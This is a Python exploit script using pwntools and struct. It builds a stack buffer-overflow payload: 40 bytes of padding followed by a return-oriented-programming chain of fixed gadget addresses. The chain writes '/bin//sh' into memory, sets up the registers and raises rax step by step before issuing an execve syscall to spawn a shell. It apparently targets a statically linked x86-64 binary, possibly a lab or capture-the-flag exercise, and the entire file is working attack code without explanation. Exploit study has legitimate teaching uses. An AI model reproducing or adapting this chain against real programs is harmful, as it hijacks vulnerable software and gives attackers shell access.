from struct import pack
from pwn import ELF, process
import sys

# Padding goes here
buffer_size = 40  # Size of the buffer you are overflowing
p = b'q' * buffer_size

p += pack('<Q', 0x000000000040f48e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e00e0) # @ .data
p += pack('<Q', 0x000000000045a7f7) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000049fed5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040f48e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e00e8) # @ .data + 8
p += pack('<Q', 0x000000000044f349) # xor rax, rax ; ret
p += pack('<Q', 0x000000000049fed5) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401932) # pop rdi ; ret
p += pack('<Q', 0x00000000004e00e0) # @ .data
p += pack('<Q', 0x000000000040f48e) # pop rsi ; ret
p += pack('<Q', 0x00000000004e00e8) # @ .data + 8
p += pack('<Q', 0x000000000040183f) # pop rdx ; ret
p += pack('<Q', 0x00000000004e00e8) # @ .data + 8
p += pack('<Q', 0x000000000044f349) # xor rax, rax ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x0000000000495550) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004012e3) # syscall

sys.stdout.buffer.write(p)

